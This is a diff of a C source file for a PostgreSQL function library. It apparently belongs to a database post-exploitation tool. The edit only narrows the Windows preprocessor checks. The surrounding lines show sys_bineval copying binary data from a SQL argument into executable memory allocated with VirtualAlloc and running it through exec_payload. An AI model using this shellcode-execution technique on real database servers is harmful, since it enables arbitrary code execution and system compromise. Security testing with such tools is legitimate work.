@@ -19,7 +19,7 @@
 	Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */
 
-#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+#if defined(_WIN32) || defined(_WIN64)
 #define _USE_32BIT_TIME_T
 #define DLLEXP __declspec(dllexport) 
 #define BUILDING_DLL 1
@@ -38,7 +38,7 @@
 
 #include <ctype.h>
 
-#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+#if defined(_WIN32) || defined(_WIN64)
 DWORD WINAPI exec_payload(LPVOID lpParameter);
 #endif
 
@@ -154,7 +154,7 @@ extern DLLIMPORT Datum sys_bineval(PG_FUNCTION_ARGS) {
 	int32 argv0_size;
 	size_t len;
 
-#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+#if defined(_WIN32) || defined(_WIN64)
 	int pID;
 	char *code;
 #else
@@ -166,7 +166,7 @@ extern DLLIMPORT Datum sys_bineval(PG_FUNCTION_ARGS) {
 	argv0_size = VARSIZE(argv0) - VARHDRSZ;
 	len = (size_t)argv0_size;
 
-#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+#if defined(_WIN32) || defined(_WIN64)
 	// allocate a +rwx memory page
 	code = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	strncpy(code, VARDATA(argv0), len);
@@ -200,7 +200,7 @@ extern DLLIMPORT Datum sys_bineval(PG_FUNCTION_ARGS) {
 	PG_RETURN_INT32(0);
 }
 
-#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+#if defined(_WIN32) || defined(_WIN64)
 DWORD WINAPI exec_payload(LPVOID lpParameter)
 {
 	__try
